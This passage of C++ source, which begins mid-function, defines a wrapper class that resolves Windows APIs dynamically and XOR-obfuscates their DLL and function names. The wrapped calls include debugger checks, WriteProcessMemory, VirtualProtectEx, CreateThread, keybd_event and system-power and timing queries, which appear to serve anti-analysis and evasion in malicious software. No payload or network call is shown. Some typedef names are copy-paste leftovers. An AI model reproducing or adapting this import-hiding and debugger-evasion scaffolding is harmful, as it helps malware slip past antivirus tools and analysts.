	LPVOID to_addr = _GetProcAddress(_LoadLibraryA(XOR_STRING("Kernel32.dll")), XOR_STRING("IsDebuggerPresent"));
	isdebuggerpresent_t isdebuggerpresent = (isdebuggerpresent_t)to_addr;
	return isdebuggerpresent();
}

LSTATUS WINAPI windows_api::RegOpenKeyExA(HKEY hKey, LPCSTR lpSubKey, DWORD ulOptions, REGSAM samDesired, PHKEY phkResult) {

	typedef LSTATUS(WINAPI* regopenkey_t)(HKEY hKey, LPCSTR lpSubKey, DWORD ulOptions, REGSAM samDesired, PHKEY phkResult);

	LPVOID to_addr = _GetProcAddress(_LoadLibraryA(XOR_STRING("Advapi32.dll")), XOR_STRING("RegOpenKeyExA"));
	regopenkey_t regopenkey = (regopenkey_t)to_addr;
	return regopenkey(hKey, lpSubKey, ulOptions, samDesired, phkResult);
}

LSTATUS WINAPI windows_api::RegQueryValueExA(HKEY hKey, LPCSTR lpValueName, LPDWORD lpReserved, LPDWORD lpType, LPBYTE lpData, LPDWORD lpcbData) {

	typedef LSTATUS(WINAPI* regqueryvalue_t)(HKEY hKey, LPCSTR lpValueName, LPDWORD lpReserved, LPDWORD lpType, LPBYTE lpData, LPDWORD lpcbData);

	LPVOID to_addr = _GetProcAddress(_LoadLibraryA(XOR_STRING("Advapi32.dll")), XOR_STRING("RegQueryValueExA"));
	regqueryvalue_t regqueryvalue = (regqueryvalue_t)to_addr;
	return regqueryvalue(hKey, lpValueName, lpReserved, lpType, lpData, lpcbData);
}

DWORD WINAPI windows_api::GetCurrentProcessId(VOID) {

	typedef DWORD(WINAPI* getcurrentprocessid_t)(VOID);

	LPVOID to_addr = _GetProcAddress(_LoadLibraryA(XOR_STRING("Kernel32.dll")), XOR_STRING("GetCurrentProcessId"));
	getcurrentprocessid_t getcurrentprocessid = (getcurrentprocessid_t)to_addr;
	return getcurrentprocessid();
}

BOOL WINAPI windows_api::VirtualProtectEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect) {

	typedef BOOL(WINAPI* virtualprotectex_t)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);

	LPVOID to_addr = _GetProcAddress(_LoadLibraryA(XOR_STRING("Kernel32.dll")), XOR_STRING("VirtualProtectEx"));
	virtualprotectex_t virtualprotectex = (virtualprotectex_t)to_addr;
	return virtualprotectex(hProcess, lpAddress, dwSize, flNewProtect, lpflOldProtect);
}

BOOL WINAPI windows_api::WriteProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T* lpNumberOfBytesWritten) {

	typedef BOOL(WINAPI* writeprocessmemory_t)(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T* lpNumberOfBytesWritten);

	LPVOID to_addr = _GetProcAddress(_LoadLibraryA(XOR_STRING("Kernel32.dll")), XOR_STRING("WriteProcessMemory"));
	writeprocessmemory_t writeprocessmemory = (writeprocessmemory_t)to_addr;
	return writeprocessmemory(hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesWritten);
}

BOOL WINAPI windows_api::CheckRemoteDebuggerPresent(HANDLE hProcess, PBOOL pbDebuggerPresent) {

	typedef BOOL(WINAPI* remotedebugger_t)(HANDLE hProcess, PBOOL pbDebuggerPresent);

	LPVOID to_addr = _GetProcAddress(_LoadLibraryA(XOR_STRING("Kernel32.dll")), XOR_STRING("CheckRemoteDebuggerPresent"));
	remotedebugger_t remotedebugger = (remotedebugger_t)to_addr;
	return remotedebugger(hProcess, pbDebuggerPresent);
}

BOOL WINAPI windows_api::GetSystemTimes(PFILETIME lpIdleTime, PFILETIME lpKernelTime, PFILETIME lpUserTime) {

	typedef BOOL(WINAPI* getsystemtimes_t)(PFILETIME lpIdleTime, PFILETIME lpKernelTime, PFILETIME lpUserTime);

	LPVOID to_addr = _GetProcAddress(_LoadLibraryA(XOR_STRING("Kernel32.dll")), XOR_STRING("GetSystemTimes"));
	getsystemtimes_t getsystemtimes = (getsystemtimes_t)to_addr;
	return getsystemtimes(lpIdleTime, lpKernelTime, lpUserTime);
}

DWORD WINAPI windows_api::SleepEx(DWORD dwMilliseconds, BOOL bAlertable) {

	typedef DWORD(WINAPI* sleepex_t)(DWORD dwMilliseconds, BOOL bAlertable);

	LPVOID to_addr = _GetProcAddress(_LoadLibraryA(XOR_STRING("Kernel32.dll")), XOR_STRING("SleepEx"));
	sleepex_t sleepex = (sleepex_t)to_addr;
	return sleepex(dwMilliseconds, bAlertable);
}

VOID WINAPI windows_api::ExitProcess(UINT uExitCode) {

	typedef VOID(WINAPI* exitprocess_t)(UINT uExitCode);

	LPVOID to_addr = _GetProcAddress(_LoadLibraryA(XOR_STRING("Kernel32.dll")), XOR_STRING("ExitProcess"));
	exitprocess_t exitprocess = (exitprocess_t)to_addr;
	return exitprocess(uExitCode);
}

BOOL WINAPI windows_api::PeekMessageA(LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin, UINT wMsgFilterMax, UINT wRemoveMsg) {

	typedef BOOL(WINAPI* peekmessage_t)(LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin, UINT wMsgFilterMax, UINT wRemoveMsg);

	LPVOID to_addr = _GetProcAddress(_LoadLibraryA(XOR_STRING("User32.dll")), XOR_STRING("PeekMessageA"));
	peekmessage_t peekmessage = (peekmessage_t)to_addr;
	return peekmessage(lpMsg, hWnd, wMsgFilterMin, wMsgFilterMax, wRemoveMsg);
}

BOOL WINAPI windows_api::TranslateMessage(CONST MSG *lpMsg) {

	typedef BOOL(WINAPI* translatemessage_t)(CONST MSG *lpMsg);

	LPVOID to_addr = _GetProcAddress(_LoadLibraryA(XOR_STRING("User32.dll")), XOR_STRING("TranslateMessage"));
	translatemessage_t translatemessage = (translatemessage_t)to_addr;
	return translatemessage(lpMsg);
}

LRESULT WINAPI windows_api::DispatchMessageA(CONST MSG *lpMsg) {

	typedef BOOL(WINAPI* dispatchmessage_t)(CONST MSG *lpMsg);

	LPVOID to_addr = _GetProcAddress(_LoadLibraryA(XOR_STRING("User32.dll")), XOR_STRING("DispatchMessageA"));
	dispatchmessage_t dispatchmessage = (dispatchmessage_t)to_addr;
	return dispatchmessage(lpMsg);
}

VOID WINAPI windows_api::GetSystemTime(LPSYSTEMTIME lpSystemTime) {

	typedef VOID(WINAPI* dispatchmessage_t)(LPSYSTEMTIME lpSystemTime);

	LPVOID to_addr = _GetProcAddress(_LoadLibraryA(XOR_STRING("Kernel32.dll")), XOR_STRING("GetSystemTime"));
	dispatchmessage_t dispatchmessage = (dispatchmessage_t)to_addr;
	return dispatchmessage(lpSystemTime);
}

BOOL WINAPI windows_api::SystemTimeToFileTime(CONST SYSTEMTIME* lpSystemTime, LPFILETIME lpFileTime) {

	typedef BOOL(WINAPI* systemtimetofiletime_t)(CONST SYSTEMTIME* lpSystemTime, LPFILETIME lpFileTime);

	LPVOID to_addr = _GetProcAddress(_LoadLibraryA(XOR_STRING("Kernel32.dll")), XOR_STRING("SystemTimeToFileTime"));
	systemtimetofiletime_t systemtimetofiletime = (systemtimetofiletime_t)to_addr;
	return systemtimetofiletime(lpSystemTime, lpFileTime);
}

DWORD WINAPI windows_api::GetTickCount(VOID) {

	typedef DWORD(WINAPI* gettickcount_t)(VOID);

	LPVOID to_addr = _GetProcAddress(_LoadLibraryA(XOR_STRING("Kernel32.dll")), XOR_STRING("GetTickCount"));
	gettickcount_t gettickcount = (gettickcount_t)to_addr;
	return gettickcount();
}

BOOL WINAPI windows_api::GetSystemPowerStatus(LPSYSTEM_POWER_STATUS lpSystemPowerStatus) {

	typedef BOOL(WINAPI* getsystempowerstatus_t)(LPSYSTEM_POWER_STATUS lpSystemPowerStatus);

	LPVOID to_addr = _GetProcAddress(_LoadLibraryA(XOR_STRING("Kernel32.dll")), XOR_STRING("GetSystemPowerStatus"));
	getsystempowerstatus_t getsystempowerstatus = (getsystempowerstatus_t)to_addr;
	return getsystempowerstatus(lpSystemPowerStatus);
}

VOID WINAPI windows_api::DebugBreak(VOID) {

	typedef VOID(WINAPI* debugbreak_t)(VOID);

	LPVOID to_addr = _GetProcAddress(_LoadLibraryA(XOR_STRING("Kernel32.dll")), XOR_STRING("DebugBreak"));
	debugbreak_t debugbreak = (debugbreak_t)to_addr;
	return debugbreak();
}

HANDLE WINAPI windows_api::CreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize,
	LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId) {
	typedef HANDLE(WINAPI* createthread_t)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize,
		LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);

	LPVOID to_addr = _GetProcAddress(_LoadLibraryA(XOR_STRING("Kernel32.dll")), XOR_STRING("CreateThread"));
	createthread_t createthread = (createthread_t)to_addr;
	return createthread(lpThreadAttributes, dwStackSize,
		lpStartAddress, lpParameter, dwCreationFlags, lpThreadId);
}

VOID WINAPI windows_api::keybd_event(BYTE bVk, BYTE bScan, DWORD dwFlags, ULONG_PTR dwExtraInfo) {
	typedef VOID(WINAPI* keybdevent_t)(BYTE bVk, BYTE bScan, DWORD dwFlags, ULONG_PTR dwExtraInfo);

	LPVOID to_addr = _GetProcAddress(_LoadLibraryA(XOR_STRING("User32.dll")), XOR_STRING("keybd_event"));
	keybdevent_t keybdevent = (keybdevent_t)to_addr;
	return keybdevent(bVk, bScan, dwFlags, dwExtraInfo);
}

HRESULT WINAPI windows_api::CreateStreamOnHGlobal(HGLOBAL hGlobal, BOOL fDeleteOnRelease, LPSTREAM *ppstm) {
	typedef HRESULT(WINAPI* createstreamonhglobal_t)(HGLOBAL hGlobal, BOOL fDeleteOnRelease, LPSTREAM *ppstm);

	LPVOID to_addr = _GetProcAddress(_LoadLibraryA(XOR_STRING("Ole32.dll")), XOR_STRING("CreateStreamOnHGlobal"));
	createstreamonhglobal_t createstreamonhglobal = (createstreamonhglobal_t)to_addr;
	return createstreamonhglobal(hGlobal, fDeleteOnRelease, ppstm);
}

BOOL WINAPI windows_api::FreeLibrary(HMODULE hLibModule) {
	typedef BOOL(WINAPI* freelibrary_t)(HMODULE hLibModule);

	LPVOID to_addr = _GetProcAddress(_LoadLibraryA(XOR_STRING("Kernel32.dll")), XOR_STRING("FreeLibrary"));
	freelibrary_t freelibrary = (freelibrary_t)to_addr;
	return freelibrary(hLibModule);
}